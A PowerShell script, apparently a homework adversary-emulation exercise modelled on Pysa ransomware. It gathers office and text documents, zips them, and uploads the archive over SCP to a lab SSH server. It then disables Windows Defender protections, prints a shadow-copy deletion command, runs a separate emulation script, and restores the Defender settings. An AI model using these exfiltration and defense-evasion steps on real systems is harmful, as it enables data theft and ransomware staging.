# Save settings that will be changed by the script
$initial_directory=$PWD
$initial_MpState=(Get-MpPreference | Select-Object DisableRealtimeMonitoring,EnableControlledFolderAccess)

# FIRST THINGS FIRST - ENSURE THAT THIS IS **ONLY** RUN IN THE INTENDED DIRECTORY!
Set-Location $PSScriptRoot

# SECOND THINGS SECOND - copied function definitions
# thanks to Harry "DevHawk" Pierson for coming up with this workaround to Resolve-Path's handling of Non-existent files
# http://devhawk.net/blog/2010/1/22/fixing-powershells-busted-resolve-path-cmdlet
function Resolve-ForcePath($filename) # Awkward rename from "force-resolve-path" to shut up "Approved Verbs" warning
{
  $filename = Resolve-Path $filename -ErrorAction SilentlyContinue -ErrorVariable _frperror
                            
  if (!$filename)
  {
    return $_frperror[0].TargetObject
  }
  return $filename
}
# ----------- TASK 1 ------------------------------------------------------------------------------------------------------
# Get a list of docx, xlsx, pdf, and txt files to exfiltrate, and put them in .\Exfiltration-Dir
New-Item -ItemType Directory -Name "Exfiltration-Dir" # create the directory
Get-ChildItem -Recurse -Include *.docx,*.xlsx,*.pdf,*.txt -Path .\Documents | ForEach-Object {
 # Check if the parent directory's "shadow" exists within .\Exfiltration-Dir. If not, make it.
    $parent_dir = Resolve-Path -Relative $_.DirectoryName
    $parent_shadow = Resolve-ForcePath (Join-Path .\Exfiltration-Dir $parent_dir)
    If (-Not (Test-Path -Path $parent_shadow)) {
        New-Item -ItemType Directory -Path $parent_shadow
    }
    # copy the item to $parent_shadow
    Copy-Item -Path $_ -Destination $parent_shadow
}
# Compress .\Exfiltration-Dir to To-Exfiltrate.zip, then delete it
Compress-Archive -Path .\Exfiltration-Dir -DestinationPath .\To-Exfiltrate.zip
Remove-Item -Recurse -Force .\Exfiltration-Dir

# Copy .\To-Exfiltrate.zip to SSH server on 192.168.6.71 port 2222
Set-SCPItem -ComputerName '192.168.6.71' -Port 2222 -Credential (Get-Credential -Message "Credentials for SSH Server") -Path .\To-Exfiltrate.zip -Destination "~/"
Remove-Item .\To-Exfiltrate.zip
# ----------- TASK 2 ------------------------------------------------------------------------------------------------------
# The really nasty stuff: Disable Windows Defender and delete Restore Points and Volume Shadow Copies

# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -EnableControlledFolderAccess 0
<#
Homework questions:
What is Defender Controlled Folder Access?
  A feature that blocks software flagged by Windows defender from editing files 
  in protected directories and alerts the user of attempts to do so.

What behavior of Pysa would cause Controlled Folder Access to trigger? 
  Attempting to encrypt user data would trigger it, preventing pysa from running, and alerting the user.
#>

# Delete shadow volume copies/restore points - THIS IS DANGEROUS
# vssadmin.exe delete shadows /for=c: /all
# Safer option: print out the command instead of running it
Write-Output 'vssadmin.exe delete shadows /for=c: /all'

# ----------- TASK 3 ------------------------------------------------------------------------------------------------------
# Run the previously-written pysa-emulation code
./step1.ps1


# ----------- Clean-Up -----------------------------------------------------------------------------------------------------
# return to the initial directory that the script was run from
Set-Location $initial_directory
# Set Windows Defender back to its initial state
Set-MpPreference -DisableRealtimeMonitoring $initial_MpState.DisableRealtimeMonitoring
Set-MpPreference -EnableControlledFolderAccess $initial_MpState.EnableControlledFolderAccess